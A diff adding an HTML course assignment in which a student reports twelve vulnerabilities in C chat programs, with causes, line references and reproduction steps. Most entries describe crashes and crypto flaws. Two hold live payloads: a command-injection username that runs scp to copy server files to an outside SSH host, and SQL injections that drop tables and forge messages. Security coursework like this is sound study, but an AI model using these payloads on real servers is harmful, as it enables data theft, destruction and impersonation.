@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>vulnerabilities</title>
+  <style>
+    html {
+      line-height: 1.5;
+      font-family: Georgia, serif;
+      font-size: 20px;
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 1em;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, 'Lucida Console', Consolas, monospace;
+      font-size: 85%;
+      margin: 0;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <style>
+    html {
+      font-size: 100%;
+      overflow-y: scroll;
+      -webkit-text-size-adjust: 100%;
+      -ms-text-size-adjust: 100%;
+    }
+    body {
+      color: #444;
+      font-family: Georgia, Palatino, "Palatino Linotype", Times,
+        "Times New Roman", serif;
+      font-size: 12px;
+      line-height: 1.7;
+      padding: 1em;
+      margin: auto;
+      max-width: 42em;
+      background: #fefefe;
+    }
+    a {
+      color: #0645ad;
+      text-decoration: none;
+    }
+    a:visited {
+      color: #0b0080;
+    }
+    a:hover {
+      color: #06e;
+    }
+    a:active {
+      color: #faa700;
+    }
+    a:focus {
+      outline: thin dotted;
+    }
+    ::-moz-selection {
+      background: rgba(255, 255, 0, 0.3);
+      color: #000;
+    }
+    ::selection {
+      background: rgba(255, 255, 0, 0.3);
+      color: #000;
+    }
+    a::-moz-selection {
+      background: rgba(255, 255, 0, 0.3);
+      color: #0645ad;
+    }
+    a::selection {
+      background: rgba(255, 255, 0, 0.3);
+      color: #0645ad;
+    }
+    p {
+      margin: 1em 0;
+    }
+    img {
+      max-width: 100%;
+    }
+    h1,
+    h2,
+    h3,
+    h4,
+    h5,
+    h6 {
+      color: #111;
+      line-height: 125%;
+      margin-top: 2em;
+      font-weight: 400;
+    }
+    h4,
+    h5,
+    h6 {
+      font-weight: 700;
+    }
+    h1 {
+      font-size: 2.5em;
+    }
+    h2 {
+      font-size: 2em;
+    }
+    h3 {
+      font-size: 1.5em;
+    }
+    h4 {
+      font-size: 1.2em;
+    }
+    h5 {
+      font-size: 1em;
+    }
+    h6 {
+      font-size: 0.9em;
+    }
+    blockquote {
+      color: #666;
+      margin: 0;
+      padding-left: 3em;
+      border-left: 0.5em #eee solid;
+    }
+    hr {
+      display: block;
+      height: 2px;
+      border: 0;
+      border-top: 1px solid #aaa;
+      border-bottom: 1px solid #eee;
+      margin: 1em 0;
+      padding: 0;
+    }
+    code,
+    kbd,
+    pre,
+    samp {
+      color: #000;
+      font-family: monospace, monospace;
+      font-size: 0.98em;
+    }
+    pre {
+      white-space: pre;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    b,
+    strong {
+      font-weight: 700;
+    }
+    dfn {
+      font-style: italic;
+    }
+    ins {
+      background: #ff9;
+      color: #000;
+      text-decoration: none;
+    }
+    mark {
+      background: #ff0;
+      color: #000;
+      font-style: italic;
+      font-weight: 700;
+    }
+    sub,
+    sup {
+      font-size: 75%;
+      line-height: 0;
+      position: relative;
+      vertical-align: baseline;
+    }
+    sup {
+      top: -0.5em;
+    }
+    sub {
+      bottom: -0.25em;
+    }
+    ol,
+    ul {
+      margin: 1em 0;
+      padding: 0 0 0 2em;
+    }
+    li p:last-child {
+      margin-bottom: 0;
+    }
+    ol ol,
+    ul ul {
+      margin: 0.3em 0;
+    }
+    dl {
+      margin-bottom: 1em;
+    }
+    dt {
+      font-weight: 700;
+      margin-bottom: 0.8em;
+    }
+    dd {
+      margin: 0 0 0.8em 2em;
+    }
+    dd:last-child {
+      margin-bottom: 0;
+    }
+    img {
+      border: 0;
+      -ms-interpolation-mode: bicubic;
+      vertical-align: middle;
+    }
+    figure {
+      display: block;
+      text-align: center;
+      margin: 1em 0;
+    }
+    figure img {
+      border: none;
+      margin: 0 auto;
+    }
+    figcaption {
+      font-size: 0.8em;
+      font-style: italic;
+      margin: 0 0 0.8em;
+    }
+    table {
+      margin-bottom: 2em;
+      border-bottom: 1px solid #ddd;
+      border-right: 1px solid #ddd;
+      border-spacing: 0;
+      border-collapse: collapse;
+    }
+    table th {
+      padding: 0.2em 1em;
+      background-color: #eee;
+      border-top: 1px solid #ddd;
+      border-left: 1px solid #ddd;
+    }
+    table td {
+      padding: 0.2em 1em;
+      border-top: 1px solid #ddd;
+      border-left: 1px solid #ddd;
+      vertical-align: top;
+    }
+    .author {
+      font-size: 1.2em;
+      text-align: center;
+    }
+    @media only screen and (min-width: 480px) {
+      body {
+        font-size: 14px;
+      }
+    }
+    @media only screen and (min-width: 768px) {
+      body {
+        font-size: 16px;
+      }
+    }
+    @media print {
+      * {
+        background: 0 0 !important;
+        color: #000 !important;
+        filter: none !important;
+        -ms-filter: none !important;
+      }
+      body {
+        font-size: 12pt;
+        max-width: 100%;
+      }
+      a,
+      a:visited {
+        text-decoration: underline;
+      }
+      hr {
+        height: 1px;
+        border: 0;
+        border-bottom: 1px solid #000;
+      }
+      a[href]:after {
+        content: " (" attr(href) ")";
+      }
+      abbr[title]:after {
+        content: " (" attr(title) ")";
+      }
+      .ir a:after,
+      a[href^="#"]:after,
+      a[href^="javascript:"]:after {
+        content: "";
+      }
+      blockquote,
+      pre {
+        border: 1px solid #999;
+        padding-right: 1em;
+        page-break-inside: avoid;
+      }
+      img,
+      tr {
+        page-break-inside: avoid;
+      }
+      img {
+        max-width: 100% !important;
+      }
+      @page :left {
+        margin: 15mm 20mm 15mm 10mm;
+      }
+      @page :right {
+        margin: 15mm 10mm 15mm 20mm;
+      }
+      h2,
+      h3,
+      p {
+        orphans: 3;
+        widows: 3;
+      }
+      h2,
+      h3 {
+        page-break-after: avoid;
+      }
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/darkreader@4.7.15/darkreader.min.js"></script>
+  <script>
+    DarkReader.enable({
+      brightness: 100,
+      contrast: 90,
+      sepia: 10
+    });
+  </script>
+  <link
+    rel="icon"
+    type="image/png"
+    href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTJg97A-Sa8mxjkRCmjR51WjHATLvq2aF89Z1CprR2WcQ60qYZC"
+  />
+  <meta name="theme-color" content="#252525" />
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<!-- markdownlint-disable MD010 MD041 MD001 MD036-->
+<h1 data-number="1"
+id="assignment-2---vulnerabilities---martynas-rimkevicius-2708302"><span
+class="header-section-number">1</span> Assignment 2 - Vulnerabilities -
+Martynas Rimkevicius 2708302</h1>
+<h2 data-number="1.1" id="vulnerability-1-program-1"><span
+class="header-section-number">1.1</span> Vulnerability 1 (program
+1)</h2>
+<p>Type: authentication error</p>
+<p>Impact: Loss of availability - users cannot see that the user, who is
+still online, is online</p>
+<p>Cause: No check for multiple instances of the same user logging in to
+different clients simultaniously (worker.c
+<code>void handle_logout</code> line 259). This would be correct if user
+was still shown as logged in, when one client logs out but the other is
+still on.</p>
+<p><strong>Steps:</strong><br />
+Client 1: <code>/register gahsd adsad</code> (user gets
+registered)<br />
+Client 2: <code>/login gahsd adsad</code> (while terminal 1 is still
+running, response is <em>authentication succeeded</em>)<br />
+Client 3: <code>/register aha test</code> (while terminal 1 and 2 are
+still running)<br />
+Client 3: <code>@gahsd test message</code> - message is delivered to
+both running user <em>gahsd</em> clients.<br />
+Client 2: quits<br />
+Client 3: <code>/users</code> command shows only <em>aha</em>;
+<code>@gahsd test 2</code> command shows <em>error: invalid
+credentials</em><br />
+To test if the Client 1 works general message from <em>gahsd</em> gets
+delivered to the Client 3, but in <code>/users</code> command it does
+not show <strong>all</strong> the users that are online.</p>
+<p><strong>Found:</strong> Trying the functional security requirements
+of the program - manual testing. In particular trying registering and
+logging in with the same username on multiple clients. It was discovered
+when one client was quit from and then the other two clients were used
+to continue test if the user was still connected. Which was not the
+case, proven by opening the database to check whether the value
+representing the “logged in” condition was not set to true for user
+<em>gahsd</em>.</p>
+<h2 data-number="1.2" id="vulnerability-2-program-2"><span
+class="header-section-number">1.2</span> Vulnerability 2 (program
+2)</h2>
+<p>Type: cryptography used incorrectly</p>
+<p>Impact: Data leak</p>
+<p>Cause: Mallory can brute force other user’s password and leak their
+private messages. Because it is not using salt to generate a password
+and using just hashing (SHA224) in client.c client_process_command()
+lines 119-139.</p>
+<p>Steps: This vulnerability was found through the code, but it can be
+exploited with simple brute force password guesser. If user is known to
+be registered, the password can be put in over and over, and thus be
+guessed over time.</p>
+<p>Found: In the database Users table there is no field for salt for the
+hash, thus this raised a suspicion that salt might not be used and once
+the hashing part of the code was located, it could be seen that it is
+not used.</p>
+<h2 data-number="1.3" id="vulnerability-3-program-2"><span
+class="header-section-number">1.3</span> Vulnerability 3 (program
+2)</h2>
+<p>Type: Incorrect error handling</p>
+<p>Impact: Data leak</p>
+<p>Cause: Users can see partial password of a new user if their created
+password is longer than (213 - length of username - 9 (“/register”) - 2
+(for spaces)). Setting a strict boundary for read, but not checking if
+there is something left over, thus the rest of the information ending up
+in a general message after registration (since by then user that is
+being registered is already logged in). client.c
+client_process_command() lines 69-71 - here it reads 213 characters from
+the stdin, but it never flushes the input, therefore with the next read
+it ends up being a general message.</p>
+<p>Steps: using /register command, have a short username (the maximum is
+set as 30 for it), and have a long password (for example, generate 256
+character length string). After putting this string in, one can see the
+part of that string being sent as a public message:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/register</span> abs rSAxVCA9DCdQcCnAK9TZGUA4gb4om4RfB5WDnswv7eMWbgl4qfNUQEb79FP063A9lswwenqx8APAuhi5bSWjpM6CqvJpWXGRxJAtLcFZgrgUsOyWfH9PjFAffAUEyXNsmdD5vSTguuDHEiu2riuLS7Ug91d5Siks50QYcHYOThp9d0cJ2k50clYR2gieB9Q0BTWAVhmF2orPkorRdsYxiuVsEI3gpd4rqVOg4defCTyt4MEpirjIloF9nCS9glDY</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">registration</span> succeeded</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 10:46:01 abs: F2orPkorRdsYxiuVsEI3gpd4rqVOg4defCTyt4MEpirjIloF9nCS9glDY</span></code></pre></div>
+<p>Found: manual code inspection - in the code I noticed limit on the
+read buffer from stdin, therefore I wanted to try a long password input
+to see how it is handled. Therefore I generated 256 character string and
+saw that it was not handled correctly.</p>
+<h2 data-number="1.4" id="vulnerability-4-program-6"><span
+class="header-section-number">1.4</span> Vulnerability 4 (program
+6)</h2>
+<p>Type: other - new users are not able to register</p>
+<p>Impact: Loss of availability</p>
+<p>Cause: user is unable to relogin or register after there are a lot of
+messages sent in the server. When a new user registers or a user relogs
+in, they retrieve only part of the messages from the database, but the
+count of messages is correctly calculated, therefore there is a read out
+of bounds and the server worker that is in the connection with this user
+SEGFAULTS. This can be seen in worker.c get_new_msgs() lines 32-41.
+Specifically this
+<code>for (int i = 0; i &lt; msg_read + priv_msg_count; i++)</code>
+traverses db_msgs array out of bounds because there is no check for
+msg_read + priv_msg_count and maximum amound of messages from the
+database: msg_read.</p>
+<p>Steps: The conversation of 3 clients was as follows:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:19:41 test2: test</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:19:45 this1: test</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:21:10 this1: lets send a lot of messages</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:21:22 test2: this is a lot of messages</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:21:28 test2: this is again</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:21:31 test2: again</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:21:33 test2: and again</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:21:39 this1: a lot of messages</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:21:45 test3: sent from you</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a><span class="ex">2022-12-13</span> 12:21:46 test3: to me</span></code></pre></div>
+<p>After this, user <em>test3</em> logged out and tried to relogin, but
+after having received feedback from the server “authentication
+succeeded”, the client exited. User <em>test2</em> used
+<code>/users</code> command and got following output:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/users</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">this1</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">test2</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ex">test3</span></span></code></pre></div>
+<p>This means that user is logged in, but the client does not work. New
+user <em>test4</em> tried to register, received the message
+“registration succeeded”, and the client crashed.</p>
+<p>Found: It was found during stress testing - sending random messages
+with initially 2 users and then adding the 3rd one.</p>
+<h2 data-number="1.5" id="vulnerability-5-program-5"><span
+class="header-section-number">1.5</span> Vulnerability 5 (program
+5)</h2>
+<p>Type: cryptography missing where required - missing message
+signatures</p>
+<p>Impact: data corruption</p>
+<p>Cause: each message sent from the client is missing the signature of
+that user, therefore the message can be modified and neither receiver,
+nor server would know that this edit occured. Since it is missing
+signatures, there is no particular location to be found in the code. The
+implementation of the signatures should be both in client send and
+receive functions to validate the messages and the server side send and
+receive, thus in the api_send, api_recv functions.</p>
+<p>Steps: The vulnerability was found in the code, and would be abused,
+according to the threat model, in the hijacked connection, which I was
+not able to do.</p>
+<p>Found: manual code inspection - it was found while looking through
+the client sending a message function, where the goal was to find how
+the message is safeguarded from being read while on the network.</p>
+<h2 data-number="1.6" id="vulnerability-6-program-2"><span
+class="header-section-number">1.6</span> Vulnerability 6 (program
+2)</h2>
+<p>Type: command injection</p>
+<p>Impact: Data leak - , and data corruption -</p>
+<p>Cause: server unknowingly can send its data to Mallory and server can
+be corrupted through command injection. This is because of not
+sanitizing username on the server side. There is an assumption, that the
+username is only alphanumeric characters, when it is sent to the server,
+because it does this check in the client side (client.c
+client_process_command() lines 105-111), but if the client is malicious,
+i.e. these lines are removed, the server generates client keys with
+their username (worker.c execute_request() line 282, rsa.c
+generate_keys() line 85 and 89
+<code>sprintf(command, "openssl genrsa -out clientkeys/%s-private-key.pem 2048 &gt; /dev/null 2&gt;&amp;1", username);</code>)</p>
+<p>Steps: Create a malicious client by removing lines 105-111 in
+client.c file, which check if the username has non-alphanumeric
+characters.<br />
+To inject a command, username cannot have spaces in its name, therefore
+spaces need to be replaced with <code>${IFS}</code> characters. Example
+of data leak can be copying current directory into a Mallory controlled
+ssh server, which does not need authentification. (Example registration
+(but this one needs authentification):
+<code>/register scp${IFS}-r${IFS}.${IFS}mrs368@ssh.data.vu.nl: test</code>).
+Also, this vulnerability allows to write the RSA key pair into any
+directory on the server, example of this
+<code>/register ../../.. password</code><br />
+If the command or the given path are too long such that the client says
+“error: invalid command format”, it is possible to disable this check in
+the client by removing lines 101-104 in the client.c file. Since this
+check is only in the client, the malicious client can inject even more
+elaborate command in the server.</p>
+<p>Found: manual code inspection - it was found when I noticed that
+there is a shell system call with the string formatter in the rsa.c,
+which uses the username. After trying to use <code>../</code> blocks to
+traverse the path back to unexpected directories, I was not able to do
+so because of the check for alphanumeric characters. However, this check
+is on the client side only, thus, after having modified the client to be
+malicious, I was able to traverse directories on the server side.</p>
+<h2 data-number="1.7" id="vulnerability-7-program-2"><span
+class="header-section-number">1.7</span> Vulnerability 7 (program
+2)</h2>
+<p>Type: SQL injection</p>
+<p>Impact: Loss of availability and data corruption</p>
+<p>Cause: It is possible to manipulate the tables, such that the server
+crashes because of SQL error and Mallory can impersonate a user by
+injecting values into the database that represent a private message sent
+by someone else. This is because sanitizing user input for SQL code only
+in the <strong>client</strong> (client.c client_process_command() lines
+148-153). If this sanitization is disabled, the SQL injection can take
+place.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> strlen<span class="op">(</span>message<span class="op">);</span> i<span class="op">++)</span> <span class="op">{</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>message<span class="op">[</span>i<span class="op">]</span> <span class="op">==</span> <span class="ch">&#39;\&#39;&#39;</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>        memmove<span class="op">(</span>message <span class="op">+</span> i <span class="op">+</span> <span class="dv">1</span><span class="op">,</span> message <span class="op">+</span> i<span class="op">,</span> strlen<span class="op">(</span>message<span class="op">)</span> <span class="op">-</span> i <span class="op">+</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>        message<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="ch">&#39;\&#39;&#39;</span><span class="op">;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Steps: create a malicious client by removing lines 148-153 in
+client.c file<br />
+messages sent to have users:<br />
+<code>/register abd asd</code><br />
+<code>/register user 123</code><br />
+message sent to have loss of availability:<br />
+<code>ap',0,'abd','NULL'); drop table Users;</code><br />
+message sent to have data corruption:<br />
+<code>ap',0,'abd','NULL'); INSERT INTO Messages VALUES(7, 'fake text', 1, 'user', 'abd');</code></p>
+<p>Found: manual code inspection - reading the client code I noticed
+that there is sanitization there, but not on the server side. This meant
+that there can be SQL injection, thus tried inputs, where the messages
+were inserted. Since after each SQL injection server crashes, I
+restarted it, relogged in and found the inserted messages. Also this was
+checked with sqlite itself - opening chat.db file and confirming that
+the messages were inserted.</p>
+<h2 data-number="1.8" id="vulnerability-8-program-4"><span
+class="header-section-number">1.8</span> Vulnerability 8 (program
+4)</h2>
+<p>Type: cryptography missing where required</p>
+<p>Impact: Data leak</p>
+<p>Cause: according to the threat model Mallory could read the data sent
+over the network connection, therefore read the private messages that
+are not intended to be seen by them. Lack of RSA encryption of
+client-server communication, when sending the messages. In lines 66-154
+client_process_command function, client.c. Messages are parsed, and
+formed to be sent to the server, but not encrypted.</p>
+<p>Steps: The vulnerability was found in the code, and would be read,
+according to the threat model, in the hijacked connection, which I was
+not able to do.</p>
+<p>Found: It was found while looking through the client sending a
+message function, where the goal was to find how the message is modified
+before it is written to the socket.</p>
+<h2 data-number="1.9" id="vulnerability-9-program-6"><span
+class="header-section-number">1.9</span> Vulnerability 9 (program
+6)</h2>
+<p>Type: Malloc error</p>
+<p>Impact: Loss of availability (crash)</p>
+<p>Cause: in api.c api_recv_packet() function, in line 377
+<code>api_packet_t *packet = malloc(hdr_size + payload_size);</code>,
+the payload_size is incorrectly calculated, such that malloc does not
+see it as a correct size. This function is called by both server worker
+and client, therefore with the given input can crash on both client and
+the worker, thus disabling the availability.</p>
+<p>Steps: after registering a user, send a message “Lorem ipsum dolor
+sit amet, consectetur adipiscing elit. Praesent ut justo scelerisque,
+semper nunc in, semper augue. Nullam in egestas libero, sit amet
+ultrices arcu. Morbi euismod vel urna sed consequat. Nulla ex leo,
+semper id erat vel vestibulu” (248 bytes).<br />
+Output either in the server or the client:
+<code>malloc(): invalid next size (unsorted)</code></p>
+<p>Found: manual testing with the mentioned input.</p>
+<h2 data-number="1.10" id="vulnerability-10-program-5"><span
+class="header-section-number">1.10</span> Vulnerability 10 (program
+5)</h2>
+<p>Type: Incorrect error handling</p>
+<p>Impact: Loss of availability (broken connection)</p>
+<p>Cause: after this error not being handled client can think it is
+still connected, but it is not anymore. Because of a long message sent
+from the client to the worker, that is being encrypted with RSA, the
+message length, that was supposed to be in the message packet itself was
+not there, and in api.c api_recv(), line 104, there is a SEGFAULT, where
+the string cannot be converted to int.</p>
+<p>Steps: after registering a user send this message:<br />
+“Lorem ipsum dolor sit amet, consectetur adipiscing elit. Praesent ut
+justo scelerisque, semper nunc in, semper augue. Nullam in egestas
+libero, sit amet ultrices arcu. Morbi euismod vel urna sed consequat.
+Nulla ex leo, semper id erat vel vestibulu” (248 bytes)</p>
+<p>Found: manual testing with the mentioned input.</p>
+<h2 data-number="1.11" id="vulnerability-11-program-1"><span
+class="header-section-number">1.11</span> Vulnerability 11 (program
+1)</h2>
+<p>Type: Use-after-free (Double free)</p>
+<p>Impact: Loss of availability (connection crash)</p>
+<p>Cause: after this error client is not connected to the server
+anymore, since the worker crashes. Realloc in api.c api_recv() function
+at line 58 <code>realloc(msg, total_size);</code>, reallocates the msg
+with the total size, but in the assigns a new pointer to msg, thus
+overwriting the pointer obtained previously, and thus the free() crashes
+on the pointer later on, since it passes a pointer to free() obtained
+previously.</p>
+<p>Steps:<br />
+After /register command send this message:<br />
+“Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin cursus
+leo vel consectetur ultricies. Proin nec augue quis enim cursus
+molestie. Etiam varius dolor ut quam ornare sodales. Nunc eu imperdiet
+tortor. Maecenas non elit quis mauris aliquam vulputate id ac augue.
+Suspendisse consequat in ante nec porta. Nunc lectus velit, facilisis
+non libero id, volutpat accumsan sapien. Duis a sodales risus. Duis
+turpis ante, iaculis a eros sit amet, facilisis interdum tortor.
+Praesent sagittis tellus vitae ornare cursus. Nulla sed pulvinar libero.
+Etiam pulvinar accumsan velit a viverra. Maecenas aliquam.” (the
+shortest message to reach this vulnerability is 608 bytes)</p>
+<p>Found: manual testing with the mentioned input to see what happens
+with long inputs.</p>
+<h2 data-number="1.12" id="vulnerability-12-program-5"><span
+class="header-section-number">1.12</span> Vulnerability 12 (program
+5)</h2>
+<p>Type: cryptography is not used correctly</p>
+<p>Impact: data leak - according to the threat model Mallory could
+hijack the network connection, and having the RSA key-pair could read
+the data.</p>
+<p>Cause: each message sent from the client is encrypted only with the
+server public key sent both ways (client-server and server-client), and
+since the message is encrypted/decrypted with the same key-pair on both
+sides, mallory, having hijacked one client, could know the key-pair and
+use it to intercept connections on the network, decrypt them,
+<strong>read and modify</strong> them and and send them, and it could
+not be known to any party. This can be seen in api.c api_recv() line 96
+<code>private_decrypt(buffer, read, "serverkeys/server-key.pem", decrypted);</code>
+and api_send() line 174
+<code>public_encrypt(serialized, strlen((char *)serialized), "serverkeys/public-key.pem", encrypted);</code>.
+Both functions are used in the client.c and worker.c to send and receive
+the messages.</p>
+<p>Steps: The vulnerability was found in the code, and would be abused,
+according to the threat model, in the hijacked connection, which I was
+not able to do.</p>
+<p>Found: It was found while looking through the client sending a
+message function, where the goal was to find how the message is
+safeguarded from being read while on the network.</p>
+</body>
+</html>
